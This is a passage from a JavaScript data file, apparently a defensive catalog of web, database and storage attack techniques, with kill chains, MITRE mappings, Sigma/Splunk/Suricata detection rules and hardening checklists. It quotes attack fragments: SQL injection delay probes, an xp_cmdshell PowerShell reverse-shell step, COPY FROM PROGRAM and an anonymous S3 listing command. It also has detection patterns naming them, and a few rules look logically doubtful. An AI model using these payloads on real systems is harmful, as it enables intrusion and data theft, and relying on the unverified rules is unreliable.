        title: "Victim Lure & Unintended Action Execution",
        mitre: "T1566.002",
        desc: "Tricking the authenticated victim into visiting the trap page; browser transmits cookies and submits the unauthorized transfer."
      }
    ],
    telemetry: {
      sources: [
        "Web Server Access Logs (Origin and Referer header telemetry)",
        "Application CSRF Token Validation Logs (CSRF Token Mismatch events)",
        "WAF / Proxy Inspection Logs"
      ],
      anomalies: [
        "State-changing POST/PUT requests with mismatched or foreign Origin / Referer headers",
        "Sudden spike in HTTP 403 Forbidden errors triggered by CSRF middleware token failures",
        "Critical account settings modifications occurring without corresponding GET navigation requests"
      ]
    },
    rules: {
      sigma: `title: Cross-Site Request Forgery (CSRF) Cross-Origin Origin Mismatch
id: e6f7a8b9-c0d1-2e3f-4a5b-6c7d8e9f0a1b
status: production
description: Detects state-changing HTTP requests where the Origin header does not match the target host.
logsource:
    category: webserver
detection:
    selection:
        cs-method:
            - 'POST'
            - 'PUT'
            - 'DELETE'
        cs-uri-stem|contains:
            - '/account/'
            - '/transfer'
            - '/admin/'
    filter:
        c-origin|contains: 'target-domain.com'
    condition: selection and not filter
level: high
tags:
    - attack.initial_access
    - attack.t1189`,
      splunk: `index=web_logs cs_method="POST" cs_uri_stem="/api/transfer*"
| eval Host=cs_host, Origin=cs_origin
| where isnotnull(Origin) AND NOT like(Origin, "%" . Host . "%")
| stats count by c_ip, cs_uri_stem, Host, Origin
| eval Alert="HIGH: State-Changing Request with Cross-Origin Mismatch (Potential CSRF)"
| table _time, c_ip, cs_uri_stem, Host, Origin, count, Alert`,
      suricata: `alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (
    msg:"SEC-ALERT State-Changing HTTP POST Without Anti-CSRF Token";
    flow:to_server,established;
    content:"POST"; http_method;
    content:"/api/account/password"; http_uri;
    content:!"csrf_token="; http_client_body;
    classtype:web-application-attack;
    sid:1000099;
    rev:1;
)`,
      sysmon: `# Verify SameSite cookie configuration in web framework:
grep -rn "SameSite" ./src/config/session.js`
    },
    defenseChecklist: [
      { id: "csrf_1", title: "Enforce SameSite=Strict or SameSite=Lax Cookies", tier: "Cookie Security", desc: "Configure all session cookies with 'SameSite=Strict' (or 'Lax' for read navigation), blocking cross-origin cookie transmission." },
      { id: "csrf_2", title: "Cryptographically Bound Anti-CSRF Synchronizer Tokens", tier: "Application Logic", desc: "Generate unpredictable, cryptographically random, per-session anti-CSRF tokens and validate them on every POST, PUT, and DELETE request." },
      { id: "csrf_3", title: "Validate Ingress Origin & Referer Headers", tier: "Web Server / Middleware", desc: "Verify that the incoming Origin or Referer header matches the application's trusted origin, dropping cross-origin state changes." },
      { id: "csrf_4", title: "Re-Authentication for Sensitive Operations", tier: "Application Logic", desc: "Require users to re-enter their current password or verify MFA before executing critical account changes (email, password, funds)." }
    ]
  },
  {
    num: 100,
    id: "http-request-smuggling",
    name: "HTTP Request Smuggling",
    shortName: "Request Smuggling",
    moduleGroup: "other-web",
    module: "Other Web Application Attacks",
    category: "other-web",
    severity: "critical",
    cvss: "9.3",
    mitre: "T1190, T1557",
    primaryTargets: "Edge Reverse Proxies, CDN Layers, Load Balancers, Backend Microservice Web Servers",
    threatActors: "Top-Tier Exploit Researchers, Nation-State Cyber Operations, APT Groups",
    summary: "HTTP Request Smuggling is an advanced attack technique exploiting discrepancies in how a front-end proxy server (load balancer, CDN) and back-end web server interpret the boundaries of HTTP requests. By manipulating conflicting 'Content-Length' (CL) and 'Transfer-Encoding' (TE) headers (CL.TE, TE.CL, TE.TE), an attacker desynchronizes the TCP connection, causing a hidden partial HTTP request to be prepended to the next legitimate user's request, hijacking sessions and bypassing front-end security controls.",
    killChain: [
      {
        step: 1,
        title: "Proxy Desynchronization Probing",
        mitre: "T1595.002",
        desc: "Sending probe requests containing both Content-Length and Transfer-Encoding headers (CL.TE / TE.CL) and measuring server response timing."
      },
      {
        step: 2,
        title: "TCP Stream Desynchronization",
        mitre: "T1190",
        desc: "Front-end forwards the request based on Content-Length, while back-end reads based on chunked Transfer-Encoding, leaving trailing payload in the pipeline."
      },
      {
        step: 3,
        title: "Request Poisoning & Session Hijack",
        mitre: "T1557",
        desc: "The smuggled prefix attaches to the next user's HTTP request, redirecting their session credentials or stealing their administrative cookies."
      }
    ],
    telemetry: {
      sources: [
        "Edge Load Balancer & Reverse Proxy Logs (AWS ALB, Cloudflare, Nginx)",
        "Backend Web Server Access Logs (Discrepancies in request count vs proxy)",
        "Network Packet Telemetry (Malformed HTTP header parsing logs)"
      ],
      anomalies: [
        "HTTP requests featuring both Content-Length and Transfer-Encoding headers in the same request",
        "Discrepancy in the number of requests logged between the edge proxy and backend application servers",
        "Backend server returning HTTP 400 Bad Request or unexpected 405 Method Not Allowed errors"
      ]
    },
    rules: {
      sigma: `title: HTTP Request Smuggling Conflicting Header Pattern
id: f7a8b9c0-d1e2-3f4a-5b6c-7d8e9f0a1b2c
status: production
description: Detects HTTP requests containing both Content-Length and Transfer-Encoding headers indicative of smuggling.
logsource:
    category: webserver
detection:
    selection:
        http_headers|contains|all:
            - 'Content-Length'
            - 'Transfer-Encoding'
    condition: selection
level: critical
tags:
    - attack.initial_access
    - attack.t1190`,
      splunk: `index=edge_proxy (http_content_length=* AND http_transfer_encoding=*)
| stats count by c_ip, cs_uri_stem, http_content_length, http_transfer_encoding
| eval Alert="CRITICAL: Conflicting Content-Length & Transfer-Encoding Headers (HTTP Request Smuggling Attempt)"
| table _time, c_ip, cs_uri_stem, http_content_length, http_transfer_encoding, Alert`,
      suricata: `alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (
    msg:"SEC-ALERT Conflicting Content-Length and Transfer-Encoding Headers (Request Smuggling)";
    flow:to_server,established;
    content:"Content-Length:"; http_header; nocase;
    content:"Transfer-Encoding:"; http_header; nocase;
    classtype:web-application-attack;
    sid:1000100;
    rev:1;
)`,
      sysmon: `# Verify backend web server rejects ambiguous chunked headers:
nginx -T | grep -i "underscores_in_headers"`
    },
    defenseChecklist: [
      { id: "smug_1", title: "Adopt End-to-End HTTP/2 or HTTP/3", tier: "Protocol Architecture", desc: "Use HTTP/2 end-to-end between clients, reverse proxies, and backend servers; HTTP/2 has unambiguous frame length definitions." },
      { id: "smug_2", title: "Drop Requests with Ambiguous Headers", tier: "Proxy Configuration", desc: "Configure front-end proxies to normalize headers and reject any request containing both Content-Length and Transfer-Encoding." },
      { id: "smug_3", title: "Disable Backend TCP Connection Reuse", tier: "Infrastructure", desc: "Disable persistent connection pipelining (Keep-Alive reuse) between front-end and back-end servers where feasible." },
      { id: "smug_4", title: "Enforce Strict RFC 7230 Compliance", tier: "Web Server", desc: "Configure web servers to reject requests with invalid whitespace, duplicate headers, or obscure chunked encoding variations." }
    ]
  },

  // =========================================================================
  // MODULE 18: DATABASE ATTACKS (101 - 105)
  // =========================================================================
  {
    num: 101,
    id: "db-privilege-escalation",
    name: "Database Privilege Escalation",
    shortName: "DB Privilege Escalation",
    moduleGroup: "database",
    module: "Database Attacks",
    category: "database",
    severity: "critical",
    cvss: "8.9",
    mitre: "T1068, T1548",
    primaryTargets: "Database User Accounts, Stored Procedures, DBA Roles, DBMS System Catalogs, Database Links",
    threatActors: "Malicious Database Administrators, Advanced Persistent Threats, Disgruntled Developers",
    summary: "Database Privilege Escalation occurs when an authenticated database user with limited privileges (e.g. read-only app user) exploits vulnerabilities, configuration flaws, or excessive stored procedure permissions (such as DEFINER / SECURITY DEFINER procedures in MySQL/PostgreSQL or TRUSTWORTHY bit in MS SQL) to acquire DBA (sysadmin, superuser) privileges, allowing full database control, file system read/write, and OS command execution.",
    killChain: [
      {
        step: 1,
        title: "Database Context & Role Enumeration",
        mitre: "T1087.002",
        desc: "Querying database system tables (pg_roles, sys.database_principals) to determine granted permissions and available procedures."
      },
      {
        step: 2,
        title: "SECURITY DEFINER Procedure Exploitation",
        mitre: "T1548",
        desc: "Invoking a procedure running with elevated owner privileges (DEFINER) with crafted arguments or search_path hijacking."
      },
      {
        step: 3,
        title: "Granting Sysadmin Privileges & OS Shell",
        mitre: "T1068",
        desc: "Adding the compromised account to the sysadmin or superuser role, followed by invoking xp_cmdshell or COPY TO PROGRAM for OS shell."
      }
    ],
    telemetry: {
      sources: [
        "Database Audit Logs (pg_audit, SQL Server Audit, Oracle Audit Trail)",
        "Database User Privilege Mutation Events (ALTER ROLE, GRANT DBA)",
        "System Process Creation Logs from Database Binaries (postgres, sqlservr.exe)"
      ],
      anomalies: [
        "Standard application database user executing GRANT ... TO or ALTER USER commands",
        "Modification of database server configuration parameters (sp_configure, shared_preload_libraries)",
        "Sudden invocation of administrative stored procedures by non-admin database connections"
      ]
    },
    rules: {
      sigma: `title: Database Role Granting Sysadmin / Superuser Privileges
id: a8b9c0d1-e2f3-4a5b-6c7d-8e9f0a1b2c3d
status: production
description: Detects SQL statements executed to grant administrative or superuser privileges to low-privileged database accounts.
logsource:
    category: database
detection:
    selection:
        query|contains:
            - 'GRANT sysadmin TO'
            - 'ALTER ROLE.*SUPERUSER'
            - 'GRANT ALL PRIVILEGES ON DATABASE'
            - 'sp_addsrvrolemember'
    condition: selection
level: critical
tags:
    - attack.privilege_escalation
    - attack.t1548`,
      splunk: `index=db_audit (query="*GRANT sysadmin*" OR query="*ALTER ROLE*SUPERUSER*" OR query="*sp_addsrvrolemember*")
| stats count by user, db_name, client_ip, query
| eval Alert="CRITICAL: Database Privilege Escalation to DBA / Superuser"
| table _time, user, db_name, client_ip, query, Alert`,
      suricata: `alert tcp $EXTERNAL_NET any -> $DB_SERVERS 1433 (
    msg:"SEC-ALERT MS SQL Server xp_cmdshell Activation Attempt";
    flow:to_server,established;
    content:"xp_cmdshell"; nocase;
    classtype:attempted-admin;
    sid:1000101;
    rev:1;
)`,
      sysmon: `# Verify PostgreSQL audit logging is active:
psql -U postgres -c "SHOW pgaudit.log;"`
    },
    defenseChecklist: [
      { id: "dpe_1", title: "Enforce Principle of Least Privilege (PoLP)", tier: "Database Hardening", desc: "Ensure application database accounts possess only strictly required DML permissions (SELECT, INSERT, UPDATE); strip DDL and admin roles." },
      { id: "dpe_2", title: "Audit & Secure SECURITY DEFINER Stored Procedures", tier: "Database Logic", desc: "Explicitly set search_path = '' on all PostgreSQL SECURITY DEFINER functions to eliminate search_path hijacking vulnerabilities." },
      { id: "dpe_3", title: "Disable Dangerous Extended Stored Procedures", tier: "DBMS Config", desc: "Permanently disable or drop xp_cmdshell, sp_OACreate, and file system export functions on database engines." },
      { id: "dpe_4", title: "Enable Comprehensive Database Activity Monitoring (DAM)", tier: "Monitoring", desc: "Deploy real-time Database Activity Monitoring (DAM) to trigger instant alerts upon any privilege modification or role change." }
    ]
  },
  {
    num: 102,
    id: "unauthorized-db-access",
    name: "Unauthorized Database Access",
    shortName: "Unauthorized DB Access",
    moduleGroup: "database",
    module: "Database Attacks",
    category: "database",
    severity: "critical",
    cvss: "9.6",
    mitre: "T1078, T1021.006",
    primaryTargets: "Exposed Database Ports (3306, 5432, 1433, 1521, 27017), Cloud Relational Instances, Redis, MongoDB",
    threatActors: "Ransomware Cartels, Shodan Crawlers, Cyber Mercenaries",
    summary: "Unauthorized Database Access occurs when adversaries establish direct network connections to database instances without valid authorization, typically due to databases inadvertently bound to public IP addresses (0.0.0.0), missing firewall rules, weak or default passwords (e.g. postgres/postgres, sa/blank), or compromised connection strings leaked in public GitHub repositories and backup archives, leading to immediate database tampering and ransomware ransom notes.",
    killChain: [
      {
        step: 1,
        title: "Internet-Wide Database Port Scanning",
        mitre: "T1595.001",
        desc: "Scanning IPv4 addresses on standard database ports (1433, 3306, 5432, 27017) using masscan or querying Shodan/Censys."
      },
      {
        step: 2,
        title: "Default Credential & Brute-Force Authentication",
        mitre: "T1110.001",
        desc: "Testing default administrative credentials (root/blank, sa/sa, postgres/postgres) or using connection strings scraped from GitHub."
      },
      {
        step: 3,
        title: "Database Dropping & Ransom Extortion",
        mitre: "T1486",
        desc: "Dumping all database tables to an external VPS, executing DROP DATABASE, and creating a README_RECOVER_YOUR_DATA table."
      }
    ],
    telemetry: {
      sources: [
        "Network Firewall Ingress Logs (Traffic on ports 1433, 3306, 5432 from external IPs)",
        "Database Authentication Logs (pg_hba.conf rejections, MySQL failed logins)",
        "Cloud Security Posture Management (CSPM public database exposure alerts)"
      ],
      anomalies: [
        "Direct database connection attempts originating from public non-whitelisted IP addresses",
        "Failed database login attempts using common administrative usernames (sa, root, postgres, admin)",
        "DROP DATABASE or DROP TABLE commands executed outside maintenance windows"
      ]
    },
    rules: {
      sigma: `title: Direct Database Connection from External Non-Whitelisted IP
id: b9c0d1e2-f3a4-5b6c-7d8e-9f0a1b2c3d4e
status: production
description: Detects direct network connection attempts to internal database ports originating from external Internet IP addresses.
logsource:
    category: firewall
detection:
    selection:
        action: 'allowed'
        dest_port:
            - 1433
            - 3306
            - 5432
            - 1521
            - 27017
            - 6379
        src_ip|startswith:
            - '10.'
            - '172.16.'
            - '192.168.'
    condition: not selection
level: critical
tags:
    - attack.initial_access
    - attack.t1078`,
      splunk: `index=db_connections NOT (src_ip IN ("10.*", "172.16.*", "192.168.*"))
| stats count by src_ip, db_port, user, status
| eval Alert="CRITICAL: Unauthorized Direct Internet Access to Enterprise Database"
| table _time, src_ip, db_port, user, status, Alert`,
      suricata: `alert tcp $EXTERNAL_NET any -> $HOME_NET [1433,3306,5432,27017] (
    msg:"SEC-ALERT Direct External Connection to Database Port";
    flow:to_server,established;
    classtype:policy-violation;
    sid:1000102;
    rev:1;
)`,
      sysmon: `# Verify database listens only on localhost or private interface:
netstat -tulpn | grep -E "5432|3306|1433|27017"`
    },
    defenseChecklist: [
      { id: "uda_1", title: "Strict Network Microsegmentation & No Public IPs", tier: "Network Architecture", desc: "Never assign public IPs to database servers; place databases inside isolated private subnets accessible only via application tier bastions." },
      { id: "uda_2", title: "Enforce Client Certificate Authentication (mTLS)", tier: "Authentication", desc: "Require mutual TLS (mTLS) with client certificates for all database connections, completely blocking unauthenticated password probing." },
      { id: "uda_3", title: "Mandatory Ephemeral PAM Credentials", tier: "Identity Governance", desc: "Enforce Privileged Access Management (HashiCorp Vault, CyberArk) to issue dynamic, short-lived database credentials." },
      { id: "uda_4", title: "Automated Cloud Security Posture Management (CSPM)", tier: "Cloud Security", desc: "Deploy CSPM tools (Wiz, Prisma Cloud, AWS Security Hub) to automatically detect and auto-remediate publicly exposed database ports." }
    ]
  },
  {
    num: 103,
    id: "db-sql-injection",
    name: "SQL Injection (Repeated)",
    shortName: "Database SQLi (Repeated)",
    moduleGroup: "database",
    module: "Database Attacks",
    category: "database",
    severity: "critical",
    cvss: "9.8",
    mitre: "T1190, T1059.004",
    primaryTargets: "Database Query Engines, Stored Procedures, Linked Servers, DBMS Extended Stored Procedures",
    threatActors: "Database Extortion Gangs, State-Sponsored Espionage, Automated Worms",
    summary: "From the database engine perspective, SQL Injection represents the execution of arbitrary Structured Query Language code directly against the relational database management system. Once SQL statements break out of data literals, attackers invoke database-level administrative routines—such as PostgreSQL COPY TO PROGRAM, Oracle DBMS_EXPORT, or Microsoft SQL Server xp_cmdshell—to elevate access from query manipulation to operating system command execution on the database host.",
    killChain: [
      {
        step: 1,
        title: "Database Engine & Version Fingerprinting",
        mitre: "T1082",
        desc: "Extracting exact database engine details using version functions (@@version, version(), banner) to locate specific DBMS CVEs."
      },
      {
        step: 2,
        title: "Stacked Query Execution & Procedure Activation",
        mitre: "T1190",
        desc: "Issuing stacked queries (separated by semicolons) to enable administrative procedures like sp_configure 'show advanced options', 1; RECONFIGURE;."
      },
      {
        step: 3,
        title: "Host Operating System Compromise",
        mitre: "T1059.004",
        desc: "Invoking EXEC xp_cmdshell 'powershell -enc ...' or PostgreSQL COPY cmd FROM PROGRAM to spawn a reverse shell on the database server."
      }
    ],
    telemetry: {
      sources: [
        "Database Audit Logs (Detailed SQL execution logging)",
        "Database Process Activity (Execution of shell commands by database service account)",
        "Database Error Logs (Unusual syntax errors caused by stacked query injection)"
      ],
      anomalies: [
        "Execution of stacked queries (multiple SQL statements in single call) by web application connections",
        "Calls to database system functions that execute OS commands (xp_cmdshell, sys_exec, COPY TO/FROM PROGRAM)",
        "Sudden creation of new database administrative accounts through inline SQL statements"
      ]
    },
    rules: {
      sigma: `title: Execution of Dangerous Database Extended Stored Procedures
id: c0d1e2f3-a4b5-6c7d-8e9f-0a1b2c3d4e5f
status: production
description: Detects invocation of xp_cmdshell, sp_configure, or PostgreSQL COPY PROGRAM from SQL connections.
logsource:
    category: database
detection:
    selection:
        query|contains:
            - 'xp_cmdshell'
            - 'COPY'
            - 'FROM PROGRAM'
            - 'sys_eval'
            - 'sp_configure'
    condition: selection
level: critical
tags:
    - attack.execution
    - attack.t1059.004`,
      splunk: `index=db_audit (query="*xp_cmdshell*" OR query="*FROM PROGRAM*" OR query="*sys_exec*")
| stats count by user, db_name, client_ip, query
| eval Alert="CRITICAL: OS Command Execution Invoked from Database Engine"
| table _time, user, db_name, client_ip, query, Alert`,
      suricata: `alert tcp any any -> $DB_SERVERS 5432 (
    msg:"SEC-ALERT PostgreSQL COPY FROM PROGRAM Command Execution Attempt";
    flow:to_server,established;
    content:"COPY"; nocase;
    content:"FROM PROGRAM"; nocase;
    classtype:attempted-admin;
    sid:1000103;
    rev:1;
)`,
      sysmon: `# Monitor child processes spawned by database daemons:
Get-Process | Where-Object {$_.Parent.ProcessName -match "sqlservr|postgres|mysqld"}`
    },
    defenseChecklist: [
      { id: "dbsqi_1", title: "Enforce Strict Parameterized Query Binding in Database Drivers", tier: "Application Logic", desc: "Mandate native driver parameterization (PreparedStatement in JDBC, prepared queries in psycopg2) to guarantee literal binding." },
      { id: "dbsqi_2", title: "Disable Stacked Queries in Database Connection Strings", tier: "Driver Config", desc: "Disable multi-statement / stacked query execution in connection pool drivers (e.g. multiStatements=false in MySQL JDBC)." },
      { id: "dbsqi_3", title: "Strip Operating System Command Extensions", tier: "Database Hardening", desc: "Drop or strictly restrict access to xp_cmdshell, pg_read_file, pg_write_file, and prevent untrusted C-language UDF creation." },
      { id: "dbsqi_4", title: "Run Database Service Under Restricted OS Virtual Account", tier: "OS Hardening", desc: "Run database processes under isolated virtual service accounts (NT Service\\MSSQLSERVER) with no write access outside data volumes." }
    ]
  },
  {
    num: 104,
    id: "blind-sql-injection",
    name: "Blind SQL Injection",
    shortName: "Blind SQL Injection",
    moduleGroup: "database",
    module: "Database Attacks",
    category: "database",
    severity: "high",
    cvss: "8.6",
    mitre: "T1190, T1083",
    primaryTargets: "Database Backends with Generic Error Pages, Blind Search Endpoints, Authentication Lookups",
    threatActors: "Automated Data Harvesting Scripts, Advanced Hackers, Penetration Testers",
    summary: "Blind SQL Injection occurs when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the SQL query or any database error details. Attackers infer database contents character-by-character using two techniques: Boolean-based blind (observing conditional true/false differences in page rendering or HTTP status) and Time-based blind (forcing the database to pause using SLEEP(5) or WAITFOR DELAY '0:0:5').",
    killChain: [
      {
        step: 1,
        title: "Conditional Logic Probing",
        mitre: "T1190",
        desc: "Injecting boolean comparisons (' AND 1=1 vs ' AND 1=2) or time delays (' AND SLEEP(5)--) to observe conditional differences."
      },
      {
        step: 2,
        title: "Character-by-Character Bisection Extraction",
        mitre: "T1083",
        desc: "Using binary search algorithms (SUBSTRING(version(),1,1) > 'M') to iteratively deduce database characters."
      },
      {
        step: 3,
        title: "Automated Schema & Hash Siphoning",
        mitre: "T1005",
        desc: "Running automated tools (sqlmap, custom Python scripts) to systematically dump entire tables over hundreds of sequential queries."
      }
    ],
    telemetry: {
      sources: [
        "Web Application Response Latency Metrics (APM traces showing 5+ second spikes)",
        "Database Slow Query Logs (Queries containing pg_sleep, SLEEP, WAITFOR DELAY)",
        "WAF Detection Logs (Repetitive query parameter length variations)"
      ],
      anomalies: [
        "Consistent 5-second or 10-second response latency spikes on specific API endpoints",
        "Single client IP issuing thousands of near-identical queries varying only by a single integer offset parameter",
        "Presence of SLEEP(), BENCHMARK(), or WAITFOR DELAY in web request parameters or database slow logs"
      ]
    },
    rules: {
      sigma: `title: Time-Based Blind SQL Injection Delay Injection
id: d1e2f3a4-b5c6-7d8e-9f0a-1b2c3d4e5f6a
status: production
description: Detects time-delay functions (SLEEP, WAITFOR DELAY, pg_sleep) commonly used in blind SQL injection.
logsource:
    category: webserver
detection:
    selection:
        cs-uri-query|contains:
            - 'WAITFOR DELAY'
            - 'WAITFOR+DELAY'
            - 'pg_sleep('
            - 'SLEEP('
            - 'BENCHMARK('
    condition: selection
level: high
tags:
    - attack.initial_access
    - attack.t1190`,
      splunk: `index=db_slow_queries (query="*WAITFOR DELAY*" OR query="*SLEEP(*" OR query="*pg_sleep(*")
| stats count by user, client_ip, query, duration
| eval Alert="HIGH: Time-Based Blind SQL Injection Detected in Slow Query Log"
| table _time, user, client_ip, duration, query, Alert`,
      suricata: `alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (
    msg:"SEC-ALERT Time-Based Blind SQL Injection Payload in Query";
    flow:to_server,established;
    content:"WAITFOR"; nocase; http_uri;
    content:"DELAY"; nocase; http_uri;
    classtype:web-application-attack;
    sid:1000104;
    rev:1;
)`,
      sysmon: `# Monitor database slow query log:
tail -f /var/log/mysql/mysql-slow.log | grep -iE "sleep|benchmark"`
    },
    defenseChecklist: [
      { id: "bsqi_1", title: "Enforce Parameterized Query Abstraction for All Dynamic Filters", tier: "Application Logic", desc: "Ensure even dynamic search, sort, and filter endpoints use strictly parameterized query builders or query criteria APIs." },
      { id: "bsqi_2", title: "Implement Strict Query Execution Timeouts", tier: "Database Config", desc: "Set strict statement execution timeouts (statement_timeout = 3000ms in PostgreSQL) to neutralize time-based blind SQLi delays." },
      { id: "bsqi_3", title: "Deploy Behavioral Anomaly Rate Limiting", tier: "WAF / API Gateway", desc: "Throttle clients that submit high volumes of requests with incremental character parameter modifications." },
      { id: "bsqi_4", title: "Generic Error Handling & Uniform Response Times", tier: "Application Security", desc: "Return uniform error messages and normalize response timing to prevent timing-based side-channel leaks." }
    ]
  },
  {
    num: 105,
    id: "db-enumeration",
    name: "Database Enumeration",
    shortName: "Database Enumeration",
    moduleGroup: "database",
    module: "Database Attacks",
    category: "database",
    severity: "medium",
    cvss: "6.5",
    mitre: "T1082, T1087.002, T1083",
    primaryTargets: "Database Information Schema, Sysobjects, Master Database, pg_catalog, v$session",
    threatActors: "Reconnaissance Scouts, Initial Access Brokers, Lateral Movement Actors",
    summary: "Database Enumeration is the systematic probing and mapping of database architecture, database version, instance name, active user accounts, password hashes, table schemas, stored procedures, and trust relationships. Attackers query system catalogs (such as information_schema.tables, sys.databases, all_tables) or invoke database fingerprinters to establish high-value targets for exfiltration or privilege escalation.",
    killChain: [
      {
        step: 1,
        title: "DBMS Version & Environment Fingerprinting",
        mitre: "T1082",
        desc: "Querying database metadata functions (VERSION(), @@VERSION, user(), current_database()) to identify DBMS flavor and patch level."
      },
      {
        step: 2,
        title: "Catalog Schema & Table Harvesting",
        mitre: "T1083",
        desc: "Querying information_schema.tables, information_schema.columns, or sys.tables to discover sensitive tables (users, payments, passwords)."
      },
      {
        step: 3,
        title: "User Account & Privilege Mapping",
        mitre: "T1087.002",
        desc: "Extracting database user tables (mysql.user, pg_shadow, sys.sql_logins) to harvest password hashes and map DBA privileges."
      }
    ],
    telemetry: {
      sources: [
        "Database Query Logs (Audit of queries touching information_schema or sys.tables)",
        "Database Performance Logs (High rate of catalog table access)",
        "WAF Telemetry (Requests containing catalog keywords)"
      ],
      anomalies: [
        "Application database user querying information_schema.tables or sys.schemas",
        "High volume of queries extracting column names from information_schema.columns",
        "Queries attempting to access mysql.user, pg_shadow, or sys.sql_logins tables"
      ]
    },
    rules: {
      sigma: `title: Database Schema Enumeration via Information Schema Query
id: e2f3a4b5-c6d7-8e9f-0a1b-2c3d4e5f6a7b
status: production
description: Detects queries targeting database metadata catalogs to map tables, columns, and user permissions.
logsource:
    category: database
detection:
    selection:
        query|contains:
            - 'information_schema.tables'
            - 'information_schema.columns'
            - 'sys.databases'
            - 'pg_catalog.pg_tables'
            - 'all_tables'
    condition: selection
level: medium
tags:
    - attack.discovery
    - attack.t1083`,
      splunk: `index=db_audit (query="*information_schema.tables*" OR query="*sys.tables*" OR query="*pg_shadow*")
| stats count by user, client_ip, query
| eval Alert="MEDIUM: Database Schema & Metadata Enumeration Activity"
| table _time, user, client_ip, count, query, Alert`,
      suricata: `alert tcp any any -> $DB_SERVERS [1433,3306,5432] (
    msg:"SEC-ALERT Inbound Database Schema Enumeration Query";
    flow:to_server,established;
    content:"information_schema"; nocase;
    classtype:attempted-recon;
    sid:1000105;
    rev:1;
)`,
      sysmon: `# Verify application user cannot access system catalogs:
psql -U app_user -d production -c "SELECT * FROM pg_shadow;"`
    },
    defenseChecklist: [
      { id: "den_1", title: "Revoke Access to System Catalogs & Information Schema", tier: "Database Permissions", desc: "Revoke read permissions on information_schema, sys, and pg_catalog views from standard application users." },
      { id: "den_2", title: "Dedicated Restricted Database Users per Service", tier: "Architecture", desc: "Ensure each microservice connects using a dedicated database user restricted strictly to its own single schema namespace." },
      { id: "den_3", title: "Mask Database Errors & Version Banners", tier: "DBMS Config", desc: "Disable banner broadcasting on database listening ports and configure application drivers to hide database dialect details." },
      { id: "den_4", title: "Alert on Catalog Query Telemetry in SIEM", tier: "Monitoring", desc: "Program real-time SIEM alerts to notify the SOC immediately if any non-DBA account queries metadata tables." }
    ]
  },

  // =========================================================================
  // MODULE 19: STORAGE SECURITY ATTACKS (106 - 110)
  // =========================================================================
  {
    num: 106,
    id: "data-leakage",
    name: "Data Leakage",
    shortName: "Data Leakage",
    moduleGroup: "storage",
    module: "Storage Security Attacks",
    category: "storage",
    severity: "high",
    cvss: "8.2",
    mitre: "T1552, T1592.002",
    primaryTargets: "Public Cloud Buckets, Unprotected Storage Shares, Debug Logs, Temporary Dumps, Backup Volumes",
    threatActors: "Data Brokers, Competitive Intelligence Firms, Opportunistic Scrapers",
    summary: "Data Leakage (also known as Data Spill or Exposure) refers to the unauthorized transmission or passive exposure of confidential, proprietary, or regulated data (PII, PHI, financial records, API keys) from within an organization to an external destination or unintended recipient. Common vectors include misconfigured AWS S3 buckets with 'AllUsers' read permissions, storage snapshots shared publicly, and sensitive data written to publicly viewable debug logs.",
    killChain: [
      {
        step: 1,
        title: "Public Storage & S3 Bucket Discovery",
        mitre: "T1592.002",
        desc: "Using automated tools (S3Scanner, GrayhatWarfare) to enumerate publicly accessible S3 buckets and Azure blobs matching company naming conventions."
      },
      {
        step: 2,
        title: "Anonymous Object Enumeration",
        mitre: "T1083",
        desc: "Executing AWS CLI 'aws s3 ls s3://target-bucket --no-sign-request' to list folder structures and object keys without authentication."
      },
      {
        step: 3,
        title: "Bulk Sensitive Data Siphoning",
        mitre: "T1552",
        desc: "Downloading database SQL dumps, customer backups, internal PDFs, and private keys exposed in public storage."
      }
    ],
    telemetry: {
      sources: [
        "Cloud Storage Access Logs (AWS S3 server access logs, CloudTrail S3 Data Events)",
        "Cloud Security Posture Management (CSPM alerts on public bucket ACLs)",
        "Egress Firewall & Data Loss Prevention (DLP) telemetry"
      ],
      anomalies: [
        "Anonymous AWS S3 GetObject requests originating from unfamiliar external IP addresses",
        "Public bucket policies (Principal: *) applied to storage containers holding customer PII",
        "High volume of outbound data transfer from storage buckets occurring during off-hours"
      ]
    },
    rules: {
      sigma: `title: Public S3 Bucket Policy Applied Allowing Anonymous Read Access
id: f3a4b5c6-7d8e-9f0a-1b2c-3d4e5f6a7b8c
status: production
description: Detects AWS CloudTrail events where an S3 bucket policy is modified to allow public or unauthenticated access.
logsource:
    category: cloud
    product: aws
detection:
    selection:
        eventName:
            - 'PutBucketPolicy'
            - 'PutBucketAcl'
        requestParameters|contains:
            - 'Principal": "*"'
            - 'AllUsers'
    condition: selection
level: critical
tags:
    - attack.initial_access
    - attack.t1552`,
      splunk: `index=aws_cloudtrail eventName IN ("PutBucketPolicy", "PutBucketAcl")
| search requestParameters="*AllUsers*" OR requestParameters="*\"Principal\":\"*\"*"
| eval Alert="CRITICAL: S3 Storage Container Made Publicly Accessible (Data Leakage Risk)"
| table _time, userIdentity.arn, requestParameters.bucketName, Alert`,
      suricata: `alert tcp $EXTERNAL_NET any -> $HOME_NET $HTTP_PORTS (
    msg:"SEC-ALERT Direct Download of Exposed Database SQL Backup File";
    flow:to_server,established;
    content:"GET"; http_method;
    content:".sql.gz"; http_uri;
    classtype:policy-violation;
    sid:1000106;
    rev:1;
)`,
      sysmon: `# Audit AWS S3 buckets for Public Access Block:
aws s3control get-public-access-block --account-id 123456789012`
    },
    defenseChecklist: [
      { id: "dlk_1", title: "Enforce Account-Level S3 Block Public Access", tier: "Cloud Governance", desc: "Enable AWS S3 Block Public Access at the organization root account level to prevent any bucket from ever being made public." },
      { id: "dlk_2", title: "Automated Data Classification & Cloud DLP", tier: "Data Security", desc: "Deploy automated DLP scanners (Amazon Macie, Google Cloud DLP) to identify, tag, and alert on sensitive PII in storage repositories." },
      { id: "dlk_3", title: "Mandatory Server-Side Encryption with Customer Managed Keys", tier: "Storage Hardening", desc: "Enforce default AES-256 or KMS envelope encryption (SSE-KMS) on all storage buckets, rejecting unencrypted uploads via bucket policies." },
      { id: "dlk_4", title: "Automated CSPM Drift Detection & Auto-Remediation", tier: "DevSecOps", desc: "Use CSPM automation to immediately revoke public bucket ACLs and notify the SOC within 60 seconds of any configuration drift." }
    ]
  },
  {
    num: 107,
    id: "data-tampering",
    name: "Data Tampering",
    shortName: "Data Tampering",
    moduleGroup: "storage",
    module: "Storage Security Attacks",
    category: "storage",
    severity: "critical",
    cvss: "8.8",
    mitre: "T1565.001, T1565.002",
